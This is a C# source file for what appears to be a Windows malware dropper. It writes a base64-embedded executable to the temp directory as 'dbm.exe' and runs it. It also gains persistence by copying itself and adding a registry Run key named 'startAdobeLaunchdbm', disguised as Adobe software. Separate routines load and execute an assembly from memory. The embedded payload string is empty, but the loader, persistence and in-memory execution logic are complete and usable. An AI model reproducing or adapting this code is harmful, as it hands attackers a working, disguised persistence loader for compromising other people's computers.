using System;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using System.Text;
using System.Net.Mail;
using System.Net;
using System.Reflection;
public static class program
{
    private static string BinaryName = "dbm.exe";
    private static void Main(string[] args)
    {
        OpenBinary.UnpackBinaryAndRun(BinaryName);
        Persist();

    }
    private static void Persist()
    {
        Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(
            @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", Microsoft.Win32.RegistryKeyPermissionCheck.ReadWriteSubTree);
        if (!File.Exists(Path.GetTempPath() + BinaryName))
            File.Copy(Application.ExecutablePath, Path.GetTempPath() + BinaryName);
        key.SetValue("startAdobeLaunchdbm", Path.GetTempPath() + BinaryName);
    }
    public static class OpenBinary
    {
        public static string KL = "";
        public static string RHTTPBIN = "";
        public static Exception EX;
        public static void RunBinaryFromMemory()
        {
            System.Threading.Thread BACKGROUND = new System.Threading.Thread(new System.Threading.ThreadStart(() => {

                Assembly bin = Assembly.Load(Convert.FromBase64String(KL));
                try
                {
                    MethodInfo Entry = bin.EntryPoint;
                    if (Entry != null)
                    {
                        object o = bin.CreateInstance(Entry.Name);
                        var returnable = Entry.Invoke(o, new object[] { new string[] { } });
                    }
                }
                catch (Exception e) { EX = e; }
            }));
        }
        public static void bang(string[] args) //command line arguments for binary here
        {
            Assembly bin = Assembly.Load(Convert.FromBase64String(KL));
            object o = bin.CreateInstance(bin.EntryPoint.Name);                  
            bin.EntryPoint.Invoke(o, new object[] { args }); 
        }
        public static void UnpackBinaryAndRun(string path)
        {
            var aa = System.IO.Path.GetTempPath() + path;
            System.IO.File.WriteAllBytes(System.IO.Path.GetTempPath() + path, Convert.FromBase64String(KL));
            System.Diagnostics.Process.Start(System.IO.Path.GetTempPath() + path);
        }
    }

}